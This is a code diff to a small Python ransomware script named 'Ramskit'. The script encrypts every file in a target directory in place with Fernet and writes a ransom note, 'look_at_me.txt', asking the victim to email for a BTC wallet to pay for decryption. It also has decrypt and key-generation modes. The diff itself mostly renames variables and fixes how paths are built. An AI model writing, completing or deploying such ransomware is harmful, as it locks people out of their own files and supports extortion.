@@ -32,26 +32,28 @@ class Ramskit:
         return self.key
 
     def encrypt_file(self, items):
+        f = Fernet(self.key)
         for item in items:
-            with open(item, 'rb') as f:
-                data = f.read()
+            with open(item, 'rb') as file:
+                data = file.read()
 
             fernet = Fernet(self.key)
             encrypted = fernet.encrypt(data)
 
-            with open(item, 'wb') as f:
-                f.write(encrypted)
+            with open(item, 'wb') as file:
+                file.write(encrypted)
 
     def decrypt_file(self, items):
+        f = Fernet(self.key)
         for item in items:
-            with open(item, 'rb') as f:
-                data = f.read()
+            with open(item, 'rb') as file:
+                data = file.read()
 
             fernet = Fernet(self.key)
             decrypted = fernet.decrypt(data)
 
-            with open(item, 'wb') as f:
-                f.write(decrypted)
+            with open(item, 'wb') as file:
+                file.write(decrypted)
 
 def load_key():
     return open('key.txt', 'rb').read()
@@ -80,15 +82,15 @@ if __name__ == '__main__':
                 f.write('''
                     Heyo, this file has been encrypted!. 
                     You need to email me so I can give u my BTC wallet for the 
-                    decrypt's purchase lololololol \n\n''')
+                    decrypt's purchase lololololol \n\n
+                ''')
         case 'decrypt':
             os.remove(path + '/look_at_me.txt')
-
             items = os.listdir(path)
-            ramskit.decrypt_file(items)
 
-            with open(path + '/look_at_me.txt', 'w') as f:
-                f.write("Now you can access your files again. Hoorah \n\n")
+            hole_path = [path + '/' + item for item in items]
+            ramskit.decrypt_file(hole_path)
+
         case 'generate_key':
             print(ramskit.generate_key())
         case _:
